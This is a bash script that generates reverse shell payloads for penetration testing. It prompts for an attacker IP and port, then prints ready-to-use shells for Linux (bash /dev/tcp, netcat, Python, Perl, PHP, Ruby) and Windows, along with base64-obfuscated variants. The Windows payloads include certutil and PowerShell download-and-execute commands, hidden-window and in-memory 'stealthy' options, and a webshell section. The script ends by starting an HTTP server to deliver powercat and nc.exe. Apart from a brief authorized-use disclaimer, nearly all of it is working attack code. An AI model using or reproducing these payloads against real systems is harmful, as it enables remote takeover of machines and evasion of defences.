#!/usr/bin/env bash
set -euo pipefail

# Reverse Shell Payload Generator
# For authorized security testing only

echo "=================================="
echo "  Reverse Shell Payload Generator"
echo "=================================="
echo ""

# 1) Get tun0 IP and print
ip=$(ip a show tun0 2>/dev/null | awk '/inet /{print $2}' | cut -d'/' -f1 || true)
echo "Your tun0 IP is:"
if [ -n "$ip" ]; then
  echo "$ip"
else
  echo "(no tun0 found)"
fi
echo ""

# 2) Ask for attacker IP (allow override)
read -r -p "Enter your IP address (press Enter to use $ip): " custom_ip
if [ -n "$custom_ip" ]; then
  ip="$custom_ip"
  echo "Using IP: $ip"
else
  echo "Using tun0 IP: $ip"
fi
echo ""

# 3) Ask for local listening port
read -r -p "Enter your listening port (e.g., 4444): " lport
if [ -z "$lport" ]; then
  echo "Error: Port is required!"
  exit 1
fi
echo "Using port: $lport"
echo ""

# 4) Ask for target system type
echo "Select target system:"
echo "1) Linux"
echo "2) Windows"
read -r -p "Choice (1/2): " sys_choice
echo ""

# 5) Ask for output format
echo "Select output format:"
echo "1) Standard (copy-paste ready)"
echo "2) Terminal-friendly (escaped quotes and special chars)"
read -r -p "Choice (1/2): " format_choice
if [ -z "$format_choice" ]; then
  format_choice="1"
fi
echo ""

if [ "$sys_choice" == "2" ]; then
  # Windows-specific: ask about file upload method
  echo "Do you need to upload files to the target?"
  echo "1) Yes - Generate download+execute payloads (Powercat/NC)"
  echo "2) No - Generate direct reverse shell payloads only"
  read -r -p "Choice (1/2): " upload_choice
  echo ""

  if [ "$upload_choice" == "1" ]; then
    # Ask for output directory on target
    read -r -p "Enter target output directory (press Enter for C:\\Windows\\Temp): " output_dir
    if [ -n "$output_dir" ]; then
      output_dir="${output_dir%/}"
      output_dir="${output_dir%\\}"
      echo "Using output directory: $output_dir"
    else
      output_dir="C:\\Windows\\Temp"
      echo "Using default directory: $output_dir"
    fi
    echo ""

    # Script and binary names
    ps_script="powercat.ps1"
    nc_binary="nc.exe"
  fi
fi

echo "==================================="
echo "  Generated Payloads"
echo "==================================="
echo ""

if [ "$sys_choice" == "1" ]; then
    echo "###################################"
    echo "# LINUX PAYLOADS"
    echo "###################################"
    echo ""
    
    if [ "$format_choice" == "2" ]; then
        echo "# Bash TCP (Terminal-Friendly)"
        printf 'bash -c "bash >& /dev/tcp/%s/%s 0>&1"\n' "$ip" "$lport"
        echo ""
    else
        echo "# Bash TCP"
        cat << EOF
bash -c 'bash >& /dev/tcp/$ip/$lport 0>&1'
EOF
        echo ""
    fi
    
    echo "# Bash TCP (Base64 Encoded)"
    BASH_CMD="bash -c 'bash >& /dev/tcp/$ip/$lport 0>&1'"
    BASH_B64=$(echo -n "$BASH_CMD" | base64 -w 0)
    echo "echo $BASH_B64 | base64 -d | bash"
    echo ""
    
    if [ "$format_choice" == "2" ]; then
        echo "# Bash UDP (Terminal-Friendly)"
        printf 'sh -c "sh >& /dev/udp/%s/%s 0>&1"\n' "$ip" "$lport"
        echo ""
    else
        echo "# Bash UDP"
        cat << EOF
sh -c 'sh >& /dev/udp/$ip/$lport 0>&1'
EOF
        echo ""
    fi
    
    echo "# Netcat (nc)"
    cat << EOF
nc -e /bin/sh $ip $lport
EOF
    echo ""
    
    echo "# Netcat (mkfifo method)"
    cat << EOF
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh 2>&1|nc $ip $lport >/tmp/f
EOF
    echo ""
    
    if [ "$format_choice" == "2" ]; then
        echo "# Python (Terminal-Friendly)"
        printf 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"%s\\\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\"])"\n' "$ip" "$lport"
        echo ""
    else
        echo "# Python"
        printf 'python -c '"'"'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'"'"'\n' "$ip" "$lport"
        echo ""
    fi
    
    echo "# Python (Base64 Encoded)"
    PY_CMD="import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$ip',$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh'])"
    PY_B64=$(echo -n "$PY_CMD" | base64 -w 0)
    if [ "$format_choice" == "2" ]; then
        printf 'python -c "import base64,sys;exec(base64.b64decode(\\\"%s\\\"))"\n' "$PY_B64"
    else
        printf 'python -c '"'"'import base64,sys;exec(base64.b64decode("%s"))'"'"'\n' "$PY_B64"
    fi
    echo ""
    
    if [ "$format_choice" == "2" ]; then
        echo "# Python3 (Terminal-Friendly)"
        printf 'python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"%s\\\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\"])"\n' "$ip" "$lport"
        echo ""
    else
        echo "# Python3"
        printf 'python3 -c '"'"'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'"'"'\n' "$ip" "$lport"
        echo ""
    fi
    
    echo "# Python3 (Base64 Encoded)"
    PY3_B64=$(echo -n "$PY_CMD" | base64 -w 0)
    if [ "$format_choice" == "2" ]; then
        printf 'python3 -c "import base64,sys;exec(base64.b64decode(\\\"%s\\\"))"\n' "$PY3_B64"
    else
        printf 'python3 -c '"'"'import base64,sys;exec(base64.b64decode("%s"))'"'"'\n' "$PY3_B64"
    fi
    echo ""
    
    if [ "$format_choice" == "2" ]; then
        echo "# Perl (Terminal-Friendly)"
        printf 'perl -e "use Socket;\$i=\\\"%s\\\";\$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"/bin/sh\\\");}"\n' "$ip" "$lport"
        echo ""
    else
        echo "# Perl"
        printf 'perl -e '"'"'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh");};'"'"'\n' "$ip" "$lport"
        echo ""
    fi
    
    echo "# Perl (Base64 Encoded)"
    PERL_CMD="use Socket;\$i=\"$ip\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh\");};"
    PERL_B64=$(echo -n "$PERL_CMD" | base64 -w 0)
    if [ "$format_choice" == "2" ]; then
        printf 'perl -e "use MIME::Base64;eval(decode_base64(\\\"%s\\\"))"\n' "$PERL_B64"
    else
        printf 'perl -e '"'"'use MIME::Base64;eval(decode_base64("%s"))'"'"'\n' "$PERL_B64"
    fi
    echo ""
    
    if [ "$format_choice" == "2" ]; then
        echo "# PHP (Terminal-Friendly)"
        printf 'php -r '\''$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh <&3 >&3 2>&3\");'\''\n' "$ip" "$lport"
        echo ""
    else
        echo "# PHP"
        printf 'php -r '"'"'$sock=fsockopen("%s",%s);exec("/bin/sh <&3 >&3 2>&3");'"'"'\n' "$ip" "$lport"
        echo ""
    fi
    
    echo "# PHP (Base64 Encoded)"
    PHP_CMD="\$sock=fsockopen(\"$ip\",$lport);exec(\"/bin/sh <&3 >&3 2>&3\");"
    PHP_B64=$(echo -n "$PHP_CMD" | base64 -w 0)
    if [ "$format_choice" == "2" ]; then
        printf 'php -r '\''eval(base64_decode(\"%s\"));'\''\n' "$PHP_B64"
    else
        printf 'php -r '"'"'eval(base64_decode("%s"));'"'"'\n' "$PHP_B64"
    fi
    echo ""
    
    if [ "$format_choice" == "2" ]; then
        echo "# Ruby (Terminal-Friendly)"
        printf 'ruby -rsocket -e'\''f=TCPSocket.open(\"%s\",%s).to_i;exec sprintf(\"/bin/sh <&%%d >&%%d 2>&%%d\",f,f,f)'\''\n' "$ip" "$lport"
    else
        echo "# Ruby"
        printf 'ruby -rsocket -e'"'"'f=TCPSocket.open("%s",%s).to_i;exec sprintf("/bin/sh <&%%d >&%%d 2>&%%d",f,f,f)'"'"'\n' "$ip" "$lport"
    fi
    echo ""

elif [ "$sys_choice" == "2" ]; then
    
    if [ "$upload_choice" == "1" ]; then
        echo "###################################"
        echo "# POWERCAT REVERSE SHELLS"
        echo "###################################"
        echo ""

        if [ "$format_choice" == "2" ]; then
            echo "# Powercat Method 1: Certutil Download + Execute (Terminal-Friendly)"
            printf 'certutil -f -urlcache -split http://%s/%s \"%s\\%s\" && powershell -NoP -W Hidden -ExecutionPolicy Bypass -File \"%s\\%s\" -c %s -p %s -e cmd\n' \
              "$ip" "$ps_script" "$output_dir" "$ps_script" "$output_dir" "$ps_script" "$ip" "$lport"
            echo ""
        else
            echo "# Powercat Method 1: Certutil Download + Execute"
            printf 'certutil -f -urlcache -split http://%s/%s "%s\\%s" && powershell -NoP -W Hidden -ExecutionPolicy Bypass -File "%s\\%s" -c %s -p %s -e cmd\n' \
              "$ip" "$ps_script" "$output_dir" "$ps_script" "$output_dir" "$ps_script" "$ip" "$lport"
            echo ""
        fi

        if [ "$format_choice" == "2" ]; then
            echo "# Powercat Method 2: PowerShell WebClient DownloadFile + Execute (Terminal-Friendly)"
            printf 'powershell -NoP -W Hidden -c \"(New-Object Net.WebClient).DownloadFile(\047http://%s/%s\047,\047%s\\%s\047); powershell -NoP -ExecutionPolicy Bypass -File \047%s\\%s\047 -c %s -p %s -e cmd\"\n' \
              "$ip" "$ps_script" "$output_dir" "$ps_script" "$output_dir" "$ps_script" "$ip" "$lport"
            echo ""
        else
            echo "# Powercat Method 2: PowerShell WebClient DownloadFile + Execute"
            cat << EOF
powershell -NoP -W Hidden -c "(New-Object Net.WebClient).DownloadFile('http://$ip/$ps_script','$output_dir\\$ps_script'); powershell -NoP -ExecutionPolicy Bypass -File '$output_dir\\$ps_script' -c $ip -p $lport -e cmd"
EOF
            echo ""
        fi

        if [ "$format_choice" == "2" ]; then
            echo "# Powercat Method 3: PowerShell WebClient DownloadString (Execute in Memory - STEALTHY) (Terminal-Friendly)"
            printf 'powershell -NoP -W Hidden -c \"IEX (New-Object Net.WebClient).DownloadString(\047http://%s/%s\047); powercat -c %s -p %s -e cmd\"\n' \
              "$ip" "$ps_script" "$ip" "$lport"
            echo ""
        else
            echo "# Powercat Method 3: PowerShell WebClient DownloadString (Execute in Memory - STEALTHY)"
            cat << EOF
powershell -NoP -W Hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://$ip/$ps_script'); powercat -c $ip -p $lport -e cmd"
EOF
            echo ""
        fi
        
        echo "# Powercat Method 3b: Base64 Encoded (DownloadString in Memory)"
        PC_CMD3="IEX (New-Object Net.WebClient).DownloadString('http://$ip/$ps_script'); powercat -c $ip -p $lport -e cmd"
        PC_B64_3=$(echo -n "$PC_CMD3" | iconv -t UTF-16LE | base64 -w 0)
        echo "powershell -NoP -W Hidden -e $PC_B64_3"
        echo ""

        if [ "$format_choice" == "2" ]; then
            echo "# Powercat Method 4: PowerShell Invoke-WebRequest + Execute (Terminal-Friendly)"
            printf 'powershell -NoP -W Hidden -c \"iwr http://%s/%s -OutFile \047%s\\%s\047 -UseBasicParsing; powershell -NoP -ExecutionPolicy Bypass -File \047%s\\%s\047 -c %s -p %s -e cmd\"\n' \
              "$ip" "$ps_script" "$output_dir" "$ps_script" "$output_dir" "$ps_script" "$ip" "$lport"
            echo ""
        else
            echo "# Powercat Method 4: PowerShell Invoke-WebRequest + Execute"
            cat << EOF
powershell -NoP -W Hidden -c "iwr http://$ip/$ps_script -OutFile '$output_dir\\$ps_script' -UseBasicParsing; powershell -NoP -ExecutionPolicy Bypass -File '$output_dir\\$ps_script' -c $ip -p $lport -e cmd"
EOF
            echo ""
        fi

        if [ "$format_choice" == "2" ]; then
            echo "# Powercat Method 5: PowerShell IEX with iwr (Execute in Memory - STEALTHY) (Terminal-Friendly)"
            printf 'powershell -NoP -W Hidden -c \"IEX (iwr http://%s/%s -UseBasicParsing); powercat -c %s -p %s -e cmd\"\n' \
              "$ip" "$ps_script" "$ip" "$lport"
            echo ""
        else
            echo "# Powercat Method 5: PowerShell IEX with iwr (Execute in Memory - STEALTHY)"
            cat << EOF
powershell -NoP -W Hidden -c "IEX (iwr http://$ip/$ps_script -UseBasicParsing); powercat -c $ip -p $lport -e cmd"
EOF
            echo ""
        fi
        
        echo "# Powercat Method 5b: Base64 Encoded (iwr in Memory)"
        PC_CMD5="IEX (iwr http://$ip/$ps_script -UseBasicParsing); powercat -c $ip -p $lport -e cmd"
        PC_B64_5=$(echo -n "$PC_CMD5" | iconv -t UTF-16LE | base64 -w 0)
        echo "powershell -NoP -W Hidden -e $PC_B64_5"
        echo ""

        echo "###################################"
        echo "# NETCAT (NC.EXE) REVERSE SHELLS"
        echo "###################################"
        echo ""

        if [ "$format_choice" == "2" ]; then
            echo "# NC Method 1: Certutil Download + Execute (Terminal-Friendly)"
            printf 'certutil -f -urlcache -split http://%s/%s \"%s\\%s\" && \"%s\\%s\" %s %s -e cmd\n' \
              "$ip" "$nc_binary" "$output_dir" "$nc_binary" "$output_dir" "$nc_binary" "$ip" "$lport"
            echo ""
        else
            echo "# NC Method 1: Certutil Download + Execute"
            printf 'certutil -f -urlcache -split http://%s/%s "%s\\%s" && "%s\\%s" %s %s -e cmd\n' \
              "$ip" "$nc_binary" "$output_dir" "$nc_binary" "$output_dir" "$nc_binary" "$ip" "$lport"
            echo ""
        fi

        if [ "$format_choice" == "2" ]; then
            echo "# NC Method 2: PowerShell WebClient DownloadFile + Execute (Terminal-Friendly)"
            printf 'powershell -NoP -W Hidden -c \"(New-Object Net.WebClient).DownloadFile(\047http://%s/%s\047,\047%s\\%s\047); Start-Process \047%s\\%s\047 -ArgumentList \047%s %s -e cmd\047 -WindowStyle Hidden\"\n' \
              "$ip" "$nc_binary" "$output_dir" "$nc_binary" "$output_dir" "$nc_binary" "$ip" "$lport"
            echo ""
        else
            echo "# NC Method 2: PowerShell WebClient DownloadFile + Execute"
            cat << EOF
powershell -NoP -W Hidden -c "(New-Object Net.WebClient).DownloadFile('http://$ip/$nc_binary','$output_dir\\$nc_binary'); Start-Process '$output_dir\\$nc_binary' -ArgumentList '$ip $lport -e cmd' -WindowStyle Hidden"
EOF
            echo ""
        fi

        if [ "$format_choice" == "2" ]; then
            echo "# NC Method 3: PowerShell Invoke-WebRequest + Execute (Terminal-Friendly)"
            printf 'powershell -NoP -W Hidden -c \"iwr http://%s/%s -OutFile \047%s\\%s\047 -UseBasicParsing; Start-Process \047%s\\%s\047 -ArgumentList \047%s %s -e cmd\047 -WindowStyle Hidden\"\n' \
              "$ip" "$nc_binary" "$output_dir" "$nc_binary" "$output_dir" "$nc_binary" "$ip" "$lport"
            echo ""
        else
            echo "# NC Method 3: PowerShell Invoke-WebRequest + Execute"
            cat << EOF
powershell -NoP -W Hidden -c "iwr http://$ip/$nc_binary -OutFile '$output_dir\\$nc_binary' -UseBasicParsing; Start-Process '$output_dir\\$nc_binary' -ArgumentList '$ip $lport -e cmd' -WindowStyle Hidden"
EOF
            echo ""
        fi

        echo "###################################"
        echo "# WEBSHELL ONE-LINERS (SHORTEST)"
        echo "###################################"
        echo ""

        if [ "$format_choice" == "2" ]; then
            echo "# Powercat - In-Memory (Best for webshells) (Terminal-Friendly):"
            printf 'powershell -c \"IEX(New-Object Net.WebClient).DownloadString(\047http://%s/%s\047);powercat -c %s -p %s -e cmd\"\n' \
              "$ip" "$ps_script" "$ip" "$lport"
            echo ""
        else
            echo "# Powercat - In-Memory (Best for webshells):"
            cat << EOF
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://$ip/$ps_script');powercat -c $ip -p $lport -e cmd"
EOF
            echo ""
        fi

        if [ "$format_choice" == "2" ]; then
            echo "# Powercat - IWR Short Version (Terminal-Friendly):"
            printf 'powershell -c \"IEX(iwr http://%s/%s -UseBasicParsing);powercat -c %s -p %s -e cmd\"\n' \
              "$ip" "$ps_script" "$ip" "$lport"
            echo ""
        else
            echo "# Powercat - IWR Short Version:"
            cat << EOF
powershell -c "IEX(iwr http://$ip/$ps_script -UseBasicParsing);powercat -c $ip -p $lport -e cmd"
EOF
            echo ""
        fi
        
        echo "# Powercat - Base64 Encoded (Compact):"
        PC_WEB="IEX(New-Object Net.WebClient).DownloadString('http://$ip/$ps_script');powercat -c $ip -p $lport -e cmd"
        PC_WEB_B64=$(echo -n "$PC_WEB" | iconv -t UTF-16LE | base64 -w 0)
        echo "powershell -e $PC_WEB_B64"
        echo ""

        if [ "$format_choice" == "2" ]; then
            echo "# NC.exe - Certutil (Most reliable for webshells) (Terminal-Friendly):"
            printf 'certutil -urlcache -f http://%s/%s %%temp%%\\%s && %%temp%%\\%s %s %s -e cmd\n' \
              "$ip" "$nc_binary" "$nc_binary" "$nc_binary" "$ip" "$lport"
            echo ""
        else
            echo "# NC.exe - Certutil (Most reliable for webshells):"
            cat << EOF
certutil -urlcache -f http://$ip/$nc_binary %temp%\\$nc_binary && %temp%\\$nc_binary $ip $lport -e cmd
EOF
            echo ""
        fi
        
        echo "# NC.exe - Certutil Base64 Wrapper:"
        NC_WEB="certutil -urlcache -f http://$ip/$nc_binary %temp%\\$nc_binary && %temp%\\$nc_binary $ip $lport -e cmd"
        NC_WEB_B64=$(echo -n "cmd /c $NC_WEB" | iconv -t UTF-16LE | base64 -w 0)
        echo "powershell -e $NC_WEB_B64"
        echo ""

    else
        # Direct Windows payloads without file upload
        echo "###################################"
        echo "# WINDOWS DIRECT PAYLOADS"
        echo "###################################"
        echo ""
        
        if [ "$format_choice" == "2" ]; then
            echo "# PowerShell Reverse Shell (Direct) (Terminal-Friendly)"
            printf 'powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient(\047%s\047,%s);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \047PS \047 + (pwd).Path + \047> \047;\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\"\n' \
              "$ip" "$lport"
            echo ""
        else
            echo "# PowerShell Reverse Shell (Direct)"
            cat << EOF
powershell -nop -c "\$client = New-Object System.Net.Sockets.TCPClient('$ip',$lport);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
EOF
            echo ""
        fi
        
        echo "# PowerShell Reverse Shell (Base64 Encoded)"
        PS_CMD="\$client = New-Object System.Net.Sockets.TCPClient('$ip',$lport);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
        PS_B64=$(echo -n "$PS_CMD" | iconv -t UTF-16LE | base64 -w 0)
        echo "powershell -nop -w hidden -e $PS_B64"
        echo ""
    fi

else
    echo "[!] Invalid choice"
    exit 1
fi

echo "==================================="
echo ""
echo "[+] Listener command:"
echo "nc -lvnp $lport"
echo ""

if [ "$sys_choice" == "2" ] && [ "$upload_choice" == "1" ]; then
    echo "==================================="
    echo "Starting HTTP server on port 80..."
    echo "==================================="
    echo ""
    echo "[!] Make sure you have $ps_script and $nc_binary in the current directory!"
    echo "[!] Remember: Only use for authorized testing!"
    echo ""
    sudo python3 -m http.server 80
fi
